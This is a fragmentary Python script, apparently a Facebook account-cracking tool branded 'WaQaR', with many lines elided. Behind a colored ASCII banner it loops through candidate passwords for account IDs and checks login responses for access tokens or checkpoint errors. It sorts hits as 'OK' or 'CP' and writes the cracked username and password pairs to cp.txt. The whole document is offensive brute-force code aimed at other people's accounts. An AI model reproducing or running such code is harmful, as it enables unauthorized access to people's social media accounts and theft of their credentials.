...
\x1b[1;97m   
888  d8b  888
888 d888b 888  8888b.   .d88888  8888b.  888d888
888d88888b888     "88b d88" 888     "88b 888P"
88888P Y88888 .d888888 888  888 .d888888 888
8888P   Y8888 888  888 Y88b 888 888  888 888
888P     Y888 "Y888888  "Y88888 "Y888888 888
                            888
                            888
                            888   \x1b[1;91m[√] \x1b[1;97mWaQaR \x1b[1;91m[√]
\x1b[1;91m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					print(("\r\x1b[1;92m[\x1b[1;92m[ WaQaR×CP]\x1b[1;92m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[1;92m[\x1b[1;92m[WaQaR✓OK]\x1b[1;92m] %s • %s               "%(fl.get("id"),i)))
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					...
					print(("\r\x1b[1;92m[\x1b[1;92m[ WaQaR×CP]\x1b[1;92m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[1;92m[\x1b[1;92m[ WaQaR×CP]\x1b[1;92m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
